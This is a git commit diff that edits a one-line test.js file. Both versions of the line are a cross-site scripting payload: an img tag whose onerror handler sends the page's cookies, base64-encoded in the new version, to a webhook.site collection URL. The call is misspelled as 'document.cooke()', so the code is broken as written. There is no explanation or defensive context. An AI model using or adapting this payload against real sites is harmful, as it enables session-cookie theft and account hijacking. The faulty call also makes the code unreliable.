2bee8c94637f73e943ff755f597e4afbf260bb3b
Ak4izZ <74589614+Ak4izZ@users.noreply.github.com>
2025-02-12 08:53:13 +0800

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,1 @@
-<img src=x onerror=this.src="https://webhook.site/44ab6ea8-66a0-4e22-9902-345cc3233ffb?cookie="+document.cooke()>
+<img src=x onerror=this.src="https://webhook.site/44ab6ea8-66a0-4e22-9902-345cc3233ffb?cookie="+btoa(document.cooke())>
